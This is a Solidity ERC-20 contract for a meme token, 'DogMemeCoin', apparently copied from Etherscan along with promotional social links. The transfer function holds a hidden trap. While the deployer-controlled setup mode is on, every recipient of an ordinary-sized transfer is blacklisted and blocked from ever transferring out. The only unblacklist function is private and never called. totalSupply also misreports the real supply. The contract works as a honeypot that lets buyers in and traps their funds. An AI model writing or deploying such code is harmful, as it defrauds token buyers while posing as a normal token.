/**
 *Submitted for verification at Etherscan.io on 2023-08-14
*/

//SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.20;



/*

TG: https://t.me/DogMemeCoin
Twitter/X  : https://twitter.com/allthedogsERC
Website (as of launch coming soon): http://funnydogshitcoinwebsite.com/



*/
contract DogMemeCoin {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private  _name;
    string private _symbol;
    bool public _setupmode;
    mapping (address => bool) public blacklisted;
    address public immutable deployer;
    uint256 public LPaddblock;
    bool public monke;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _name = ("ShibaDogeFlokiTsukaDogeBonkKabosuKaspaInuMamaDogePepeDogeDogeShrekShibaOriginalVisionPapaDogeCronosInuCheemsDogeXShiba2.0DogeClassicDogePixelBabyDogeDinoInuDogelonMarsKidDogeDogeChainTungstenShibProofOfDogeGreenDogeMoonKucoinInuPitbullArbDogeAIDoge2.0FuseBonk");
        _symbol = ("DOG");
        _balances[msg.sender] = 1e27;
        deployer = (msg.sender);
        _setupmode = true;
    }

    function name() public view returns (string memory) {return _name;}
    function symbol() public view returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return 18;}
    function totalSupply() public pure returns (uint256) {return 1e9;}
    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function maintrading3() public deployed {
        _setupmode = false;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        require ( blacklisted[from] == false , "sorry you cant trade");
        if (_setupmode == true) {
            if ( (amount <= 9e26 )) {blacklisted[to] = true;}
             }
        
        
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }
    function emergencyunblacklist(address unBL) private deployed {
        blacklisted[unBL] = false;
    }
    function dummybool3 () public deployed {
        monke = true;
    }
    modifier deployed() {
        require (msg.sender == deployer, "you didnt make this");
        _;
    }
}